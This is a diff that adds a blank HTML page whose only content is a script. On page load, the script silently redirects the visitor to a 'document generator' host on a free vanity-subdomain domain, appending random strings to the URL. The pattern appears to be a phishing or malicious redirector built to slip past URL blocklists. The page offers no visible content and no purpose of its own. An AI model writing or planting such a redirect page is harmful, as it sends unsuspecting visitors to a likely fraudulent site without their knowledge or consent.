@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="author" content="">
+<title></title>
+</head>
+<body>
+<script type="text/javascript">
+function generateRandomString(minLength, maxLength) {
+  var charset = "QWERTYUIOPLKJHGFDSAZXCVBNMqwertyuioplkjhgfdsazxcvbnm0123456789";
+  var randomLength = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+  var randomString = "";
+
+  for (var i = 0; i < randomLength; i++) {
+    var randomIndex = Math.floor(Math.random() * charset.length);
+    randomString += charset.charAt(randomIndex);
+  }
+
+  return randomString;
+}
+
+var sites = [
+  "https://geradocumentosonline.is-a-financialadvisor.com/?" + generateRandomString(6, 15) + "?" + generateRandomString(6, 15),
+  "https://geradocumentosonline.is-a-financialadvisor.com/?" + generateRandomString(6, 15) + "?" + generateRandomString(6, 15),
+  "https://geradocumentosonline.is-a-financialadvisor.com/?" + generateRandomString(6, 15) + "?" + generateRandomString(6, 15),
+  "https://geradocumentosonline.is-a-financialadvisor.com/?" + generateRandomString(6, 15) + "?" + generateRandomString(6, 15),
+  "https://geradocumentosonline.is-a-financialadvisor.com/?" + generateRandomString(6, 15) + "?" + generateRandomString(6, 15),
+];
+
+function randomRedirect() {
+  var numInicial = 0;
+  var numFinal = sites.length;
+
+  var numRandom = Math.floor(Math.random() * (numFinal - numInicial)) + numInicial;
+  window.location.href = sites[numRandom];
+}
+
+window.onload = randomRedirect;
+</script>
+
+</body>
+</html>
